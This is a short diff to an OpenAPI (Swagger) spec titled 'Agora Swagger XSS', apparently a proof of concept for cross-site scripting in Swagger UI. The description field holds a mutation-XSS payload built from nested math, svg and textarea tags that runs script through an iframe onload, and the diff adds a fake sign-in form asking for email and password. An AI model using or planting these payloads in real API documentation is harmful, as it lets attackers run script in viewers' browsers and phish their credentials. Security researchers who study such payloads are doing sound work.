@@ -4,4 +4,9 @@ info:
   title: Agora Swagger XSS
   description:
     <img src="https://feeds.abplive.com/onecms/images/uploaded-images/2021/11/23/ec803eb776e07413737f3bbd662a3989_original.jpg?impolicy=abp_images&imwidth=720">
+    <form>
+      <label><input id="textbox" type="text" placeholder="EMAIL" style="width:320px;height=30px"></label><br>
+      <label> <input  id="textbox" type="text" placeholder="PASSWORD" style="width:320px"></label><br>
+      <input type="submit" value="SIGN IN" onclick="msg()">
+     </form> 
     xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
